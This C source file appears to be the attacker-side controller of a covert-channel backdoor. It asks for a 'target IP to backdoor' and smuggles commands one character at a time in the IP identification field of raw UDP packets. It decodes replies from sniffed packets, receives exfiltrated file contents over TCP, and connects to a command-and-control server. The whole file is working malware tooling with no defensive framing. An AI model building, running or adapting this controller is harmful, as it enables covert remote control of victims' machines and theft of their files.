#include "attacker.h"

int main(void) {
    struct options_attacker opts;
    u_char* args = NULL;
    char errbuf[PCAP_ERRBUF_SIZE] = {0};
    char* nic_interface;
    bpf_u_int32 netp, maskp;
    pcap_t* nic_fd;
    struct bpf_program fp;
    pthread_t udp_thread, tcp_thread, cnc_thread;

    check_root_user();
    signal(SIGINT,sig_handler);
    program_setup();
    options_attacker_init(&opts);
    get_victim_ip(&opts);
    nic_interface = pcap_lookupdev(errbuf);
    get_my_ip(nic_interface, &opts);
    puts("============ Initialize program ============");
    fflush(stdout);


    if (pthread_create(&udp_thread, NULL, udp_select_call, (void*)&opts) != 0) {
        perror("udp thread create error");
        exit(EXIT_FAILURE);
    }

    if (pthread_create(&tcp_thread, NULL, tcp_select_call, (void*)&opts) != 0) {
        perror("tcp thread create error");
        exit(EXIT_FAILURE);
    }

    if (pthread_create(&cnc_thread, NULL, cnc_checker, (void*)&opts) != 0) {
        perror("cnc thread_create error");
        exit(EXIT_FAILURE);
    }

    pcap_lookupnet(nic_interface, &netp, &maskp, errbuf);
    nic_fd = pcap_open_live(nic_interface, BUFSIZ, 1, -1, errbuf);
    args = (u_char*)&opts;
    if (nic_fd == NULL) {
        printf("pcap_open_live(): %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    if (pcap_compile (nic_fd, &fp, FILTER, 0, netp) == -1) {
        fprintf(stderr,"Error calling pcap_compile\n");
        exit(1);
    }

    // Load the filter into the capture device
    if (pcap_setfilter (nic_fd, &fp) == -1) {
        fprintf(stderr,"Error setting filter\n");
        exit(1);
    }
    pcap_loop(nic_fd, DEFAULT_COUNT, pkt_callback, args);
    return EXIT_SUCCESS;
}


void options_attacker_init(struct options_attacker *opts) {
    memset(opts, 0, sizeof(struct options_attacker));
}


void get_victim_ip(struct options_attacker *opts) {
    uint8_t input_length;

    while (1) {
        printf("Enter [ TARGET IP ] to backdoor: ");
        fflush(stdout);
        fgets(opts->victim_ip, sizeof(opts->victim_ip), stdin);
        input_length = (uint8_t) strlen(opts->victim_ip);
        if (input_length > 0 && opts->victim_ip[input_length - 1] == '\n') {
            opts->victim_ip[input_length - 1] = '\0';
            if (is_valid_ipaddress(opts->victim_ip) == 0) {
                puts("Invalid IP address");
            }
            else break;
        }
    }
}


bool is_valid_ipaddress(char *ip_address) {
    struct sockaddr_in sa;
    int result;

    result = inet_pton(AF_INET, ip_address, &(sa.sin_addr));
    return result;
}


void create_attacker_udp_socket(struct options_attacker *opts, struct sockaddr_in* victim_address) {
    int enable = 1;
    memset(victim_address, 0, sizeof(struct sockaddr_in));

    opts->udp_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    if (opts->udp_socket == -1) {
        perror("socket() ERROR\n");
        exit(EXIT_FAILURE);
    }

    if (setsockopt(opts->udp_socket, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable)) < 0) {
        perror("Error setting IP_HDRINCL option");
        exit(EXIT_FAILURE);
    }


    // VICTIM SERVER
    victim_address->sin_family = AF_INET;
    victim_address->sin_port = htons(DEFAULT_UDP_PORT);
    victim_address->sin_addr.s_addr = inet_addr(opts->victim_ip);


    if (victim_address->sin_addr.s_addr == (in_addr_t) - 1) {
        fatal_errno(__FILE__, __func__, __LINE__, errno, 2);
    }
}


void get_my_ip(char *nic_interface, struct options_attacker *opts) {
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, nic_interface, IFNAMSIZ-1);

    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);

    strcpy(opts->my_ip, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
}


unsigned short create_udp_header(struct udphdr* uh) {
    uh->source = htons(generate_random_port());
    uh->dest = htons(DEFAULT_UDP_PORT);
    uh->len = htons(sizeof(struct udphdr));
    uh->check = calculate_checksum(&uh, sizeof(struct udphdr));

    return sizeof(struct udphdr);
}


unsigned short create_ip_header(struct iphdr* ih, char c, struct options_attacker *opts) {
    ih->ihl = 5;
    ih->version = 4;
    ih->tos = 0;
    ih->id = htons(hide_data((uint16_t)c));
    ih->tot_len = htons(28);
    ih->ttl = 64;
    ih->frag_off = 0;
    ih->protocol = IPPROTO_UDP;
    ih->saddr = host_convert(opts->my_ip);
    ih->daddr = host_convert(opts->victim_ip);
    ih->check = calculate_checksum(&ih, sizeof(struct iphdr));

    return sizeof(struct iphdr);
}


void* udp_select_call(void* arg) {
    struct options_attacker *opts = (struct options_attacker*)arg;
    struct sockaddr_in victim_address;
    char instruction[64] = {0}, s_buffer[SEND_SIZE] = {0};
    int byte;

    fd_set reads, cpy_reads;
    struct timeval timeout;
    int fd_max, fd_num;

    struct iphdr ih;
    struct udphdr uh;
    size_t length = 0;

    timeout.tv_sec = 1;
    timeout.tv_usec = 0;

    create_attacker_udp_socket(opts, &victim_address);

    FD_ZERO(&reads);
    FD_SET(STDIN_FILENO, &reads);

    fd_max = STDIN_FILENO;

    while (1) {
        cpy_reads = reads;
        fd_num = select(fd_max + 1, &cpy_reads, 0, 0, &timeout);
        if (fd_num == -1) {
            perror("Select() failed");
            exit(EXIT_FAILURE);
        }
        else if (fd_num == 0) continue; // time out
        for (int i = 0; i < fd_max + 1; i++) {
            if (FD_ISSET(i, &cpy_reads)) {
                if (i == STDIN_FILENO) {
                    puts("============ RESULT ============");
                    if (fgets(opts->victim_instruction, sizeof(opts->victim_instruction), stdin)) {
                        opts->victim_instruction[strlen(opts->victim_instruction) - 1] = 0;
                        if (strstr(opts->victim_instruction, "cnc") != NULL) {
                            strcpy(opts->cnc_ip, opts->victim_instruction + 4);
                            opts->cnc = TRUE;
                        }
                        if (strstr(opts->victim_instruction, "target") != NULL ) {
                            strcpy(opts->target_directory, opts->victim_instruction + 7);
                        }
                        sprintf(instruction, "[[%s]]", opts->victim_instruction);
                        length = strlen(instruction);
                        for (int j = 0; j < length; j++) {
                            create_udp_header(&uh);
                            create_ip_header(&ih, instruction[j], opts);
                            memcpy(s_buffer, &ih, sizeof(struct iphdr));
                            memcpy(s_buffer + sizeof(struct iphdr), &uh, sizeof(struct udphdr));
                            byte = (int)sendto(opts->udp_socket, (const char*)s_buffer, SEND_SIZE, 0,
                                          (const struct sockaddr*)&victim_address, sizeof(victim_address));
                            if (byte < 0) {
                                perror("send failed\n");
                            }
                            memset(s_buffer, 0, SEND_SIZE);
                        }
                        memset(instruction, 0, 64);
                    }
                }
            }
        }
    }
    close(opts->udp_socket);
    pthread_exit(NULL);
}


void pkt_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    struct ether_header* ether;

    /* ETHERNET - only handle IPv4 */
    ether = (struct ether_header*)(packet);
    if (ntohs(ether->ether_type) == ETHERTYPE_IP) {
        process_ipv4(args, pkthdr, packet);
    }
}


void process_ipv4(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    struct ether_header* ether;
    struct iphdr *ip;

    ether = (struct ether_header*)(packet);
    ip = (struct iphdr*)(((char*) ether) + sizeof(struct ether_header));
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    printf("%c", (char)hide_data(ntohs(ip->id)));
}


void* cnc_checker(void* arg) {
    struct options_attacker *opts = (struct options_attacker*)arg;
    struct sockaddr_in cnc_address;

    memset(&cnc_address, 0, sizeof(struct sockaddr_in));
    while (1) {
        if(opts->cnc == TRUE) break;
    }
    cnc_select_call(opts, cnc_address);
}


void create_attacker_cnc_socket(struct options_attacker *opts, struct sockaddr_in *cnc_address) {
    opts->cnc_socket = socket(AF_INET, SOCK_STREAM, 0);

    if (opts->cnc_socket == -1) {
        perror("socket() ERROR\n");
        exit(EXIT_FAILURE);
    }

    // VICTIM SERVER
    cnc_address->sin_family = AF_INET;
    cnc_address->sin_port = htons(CNC_PORT);
    cnc_address->sin_addr.s_addr = inet_addr(opts->cnc_ip);

    if (cnc_address->sin_addr.s_addr == (in_addr_t) - 1) {
        fatal_errno(__FILE__, __func__, __LINE__, errno, 2);
    }
}



void cnc_select_call(struct options_attacker *opts, struct sockaddr_in cnc_address) {
    char buffer[OUTPUT_SIZE] = {0};

    fd_set reads, cpy_reads;
    struct timeval timeout;
    int fd_max, fd_num;

    size_t length = 0;
    int enable = 1;

    timeout.tv_sec = 1;
    timeout.tv_usec = 0;

    create_attacker_cnc_socket(opts, &cnc_address);

    sleep(1);
    if (connect(opts->cnc_socket, (struct sockaddr*)&cnc_address,
                sizeof(cnc_address)) < 0) {
        printf("connect() failed\n");
        exit(1);
    }

    FD_ZERO(&reads);
    FD_SET(opts->cnc_socket, &reads);


    fd_max = opts->cnc_socket;

    while (1) {
        cpy_reads = reads;
        fd_num = select(fd_max + 1, &cpy_reads, 0, 0, &timeout);
        if (fd_num == -1) {
            perror("Select() failed");
            exit(EXIT_FAILURE);
        }
        else if (fd_num == 0) continue; // time out
        for (int i = 0; i < fd_max + 1; i++) {
            if (FD_ISSET(i, &cpy_reads)) {
                if (opts->cnc_socket != 0) {
                    if (i == opts->cnc_socket) {
                        read(opts->cnc_socket, buffer, OUTPUT_SIZE);
                        printf("[ CVC SERVER ]: %s\n", buffer);
                        memset(buffer, 0, sizeof(char) * OUTPUT_SIZE);
                    }
                }
            }
        }
    }
}


void* tcp_select_call(void* arg) {
    struct options_attacker *opts = (struct options_attacker *) arg;
    struct sockaddr_in victim_address;
    int byte;
    char buffer[OUTPUT_SIZE] = {0};

    fd_set reads, cpy_reads;
    struct timeval timeout;
    int fd_max, fd_num;

    size_t length = 0;

    timeout.tv_sec = 0;
    timeout.tv_usec = 200;

    create_attacker_tcp_socket(opts, &victim_address);

    if (connect(opts->tcp_socket, (struct sockaddr*)&victim_address,
                sizeof(victim_address)) < 0) {
        printf("tcp connect() failed\n");
        exit(1);
    }


    FD_ZERO(&reads);
    FD_SET(opts->tcp_socket, &reads);

    fd_max = opts->tcp_socket;

    while (1) {
        cpy_reads = reads;
        fd_num = select(fd_max + 1, &cpy_reads, 0, 0, &timeout);
        if (fd_num == -1) {
            perror("Select() failed");
            exit(EXIT_FAILURE);
        }
        else if (fd_num == 0) continue; // time out
        for (int i = 2; i < fd_max + 1; i++) {
            if (FD_ISSET(i, &cpy_reads)) {
                if (i == opts->tcp_socket) {
                    read(opts->tcp_socket, buffer, sizeof(buffer));
//                    setvbuf(stdout, NULL, _IONBF, 0);
//                    setvbuf(stderr, NULL, _IONBF, 0);
                    printf("FILE: \n%s", buffer);
                    memset(buffer, 0, sizeof(buffer));
                }
            }
        }
    }
    close(opts->udp_socket);
    pthread_exit(NULL);
}


void create_attacker_tcp_socket(struct options_attacker *opts, struct sockaddr_in *tcp_address) {
    opts->tcp_socket = socket(AF_INET, SOCK_STREAM, 0);

    if (opts->tcp_socket == -1) {
        perror("socket() ERROR\n");
        exit(EXIT_FAILURE);
    }

    // VICTIM SERVER
    tcp_address->sin_family = AF_INET;
    tcp_address->sin_port = htons(DEFAULT_TCP_PORT);
    tcp_address->sin_addr.s_addr = inet_addr(opts->victim_ip);

    if (tcp_address->sin_addr.s_addr == (in_addr_t) - 1) {
        fatal_errno(__FILE__, __func__, __LINE__, errno, 2);
    }
}
